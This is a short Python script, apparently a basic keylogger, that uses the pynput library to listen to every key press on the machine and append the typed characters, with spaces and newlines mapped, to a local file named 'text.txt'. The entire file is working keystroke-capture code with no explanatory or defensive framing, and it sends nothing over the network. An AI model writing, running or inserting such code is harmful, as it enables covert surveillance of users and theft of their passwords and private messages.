from pynput.keyboard import Listener


def me(key):
    letter=str(key)
    letter = letter.replace("'","")
    
    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ''
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"
    with open('text.txt','a') as f :
       f.write(letter)




with Listener(on_press=me) as n:

    n.join()






